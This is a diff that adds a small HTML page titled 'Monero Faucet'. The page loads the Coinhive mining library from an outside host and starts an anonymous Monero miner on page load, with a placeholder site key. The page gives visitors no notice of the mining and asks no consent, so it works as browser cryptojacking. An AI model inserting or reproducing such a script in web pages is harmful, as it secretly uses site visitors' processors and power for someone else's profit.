@@ -1,0 +1,9 @@
+<html>
+    <h1> Monero Faucet </h1>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('<site-key>');
+	    miner.start();
+        miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+    </script>
+</html>
